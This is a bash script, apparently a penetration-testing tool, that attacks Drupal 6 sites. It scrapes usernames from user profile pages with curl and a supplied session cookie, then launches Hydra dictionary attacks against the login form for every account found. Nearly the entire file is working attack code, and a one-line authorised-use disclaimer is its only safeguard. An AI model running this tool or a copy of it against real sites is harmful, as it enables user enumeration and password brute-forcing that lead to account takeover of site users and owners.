#!/bin/bash

# Drupal 6 - Account Forcer
# greg.foss[at]owasp.org
#
# ONLY USE THIS SCRIPT LEGALLY, AGAINST AUTHORIZED TARGETS
# THE DEVELOPER OF THIS SCRIPT IS NOT LIABLE FOR ILLEGAL/QUESTIONABLE ACTIVITIES CONDUCTED WITH THIS TOOL
# BY RUNNING THIS SCRIPT, YOU AGREE THAT YOU HAVE READ AND UNDERSTAND THESE TERMS

#display banner and define variables
echo "  ___                      _    __              "
echo " |   \ _ _ _  _ _ __  __ _| |  / /              "
echo " | |) | '_| || | '_ \/ _\` | | / _ \             "
echo " |___/|_|  \_,_| .__/\__,_|_| \___/             "
echo "               |_|                              "
echo "                         Drupal 6 Account Forcer"
echo "                         greg.foss[at]owasp.org "
echo ""
echo -e "[-] Define the target application: [www.site.com]"
read site
out=$(echo $site | cut -d "/" -f 1)
sub=$(echo $site | cut -d "/" -f 2)
slash=$(echo $sub | wc -l)
if [ $slash = "1" ]; then
	s="/"
else
	s=""
fi
pre=$(echo $s$sub)
echo -e "[-] Enter your session id: [session=id]"
read session
echo -e "[-] Protocol: [http] / [https]"
read proto
if [ $proto = "http" ]; then
	protocol="http"
else
	protocol="-k https"
fi
echo -e "[-] Is the application using clean URL's? [y/n]"
read clean
echo -e "[-] How many accounts do you want to attack?"
read accounts
echo -e "[-] Provide the wordlist you would like to use:"
read file
if [ -e $file ]; then
	echo "     [*]"$file" exists"
else
	echo "     [-]"$file" does not exist..."
	echo ""
	exit 2
fi

#um... yeah...
echo ""
echo "extracting usernames..."
echo ""

#create local directory and curl data from the site
mkdir export
if [ $clean = "n" ]; then
	for i in $(seq 1 $accounts);
	do
		curl -s -b $session $protocol://$site/?q=user/$i > export/$i.txt
	done
else
	for i in $(seq 1 $accounts);
	do
		curl -s -b $session $protocol://$site/user/$i > export/$i.txt
	done
fi

#pull important info, make it pretty and store data
cat export/* | grep "<title>" | cut -d "-" -f 3 | sed 's/........$//' | cut -d ">" -f 2 | cut -d "|" -f 1 | grep -i -v "page not found\|access denied" >> usernames.txt
cat usernames.txt | sort | uniq > $out"_usernames_"`date '+%m%d%Y'`".txt"
count=$(cat usernames.txt | wc -l);

#display + count usernames
if [ $count = "0" ]; then
	echo "No usernames recovered..."
	echo "Ensure that you have entered a valid Session ID and try again"
	rm usernames.txt
	rm -rf export
	echo ""
	exit 2
else
	echo $count" => targets identified"
	echo "----------------------------------------"
	cat $out"_usernames_"`date '+%m%d%Y'`".txt"
	echo "----------------------------------------"
	echo "accounts saved to => "$out"_usernames_"`date '+%m%d%Y'`".txt"
	echo ""
fi

#run a dictionary attack against user accounts
id=$(curl -s $protocol://$site/user/ | grep "form_build_id" | cut -d "\"" -f 6)
echo "attempting to access "$accounts" accounts using the wordlist ("$file")"
echo $(cat $file| wc -l )" logon attempts will be made against each account"

#run hydra against each account and display results
echo ""
echo "launching Hydra..."
echo "----------------------------------------"
if [ $protocol = "http" ]; then
	/usr/bin/hydra -L usernames.txt -P $file $out http-form-post $pre"/?q=user/:name=^USER^&pass=^PASS^&form_id=user_login&form_build_id="$id":Sorry"
#hydra -l admin -P pwds.txt attacking.drupal.org http-post-form "/d6/node?destination=node:name=^USER^&pass=^PASS^&form_id=user_login_block&form_build_id=form-4f81eea9f5f4743e490ba666f0c32384:Sorry"
else
	/usr/bin/hydra -L usernames.txt -P $file $out https-form-post $pre"/?q=user/:name=^USER^&pass=^PASS^&form_id=user_login&form_build_id="$id":Sorry"
fi
echo "----------------------------------------"
echo ""
echo "party on..."
echo ""

#clean up
rm usernames.txt
rm -rf export
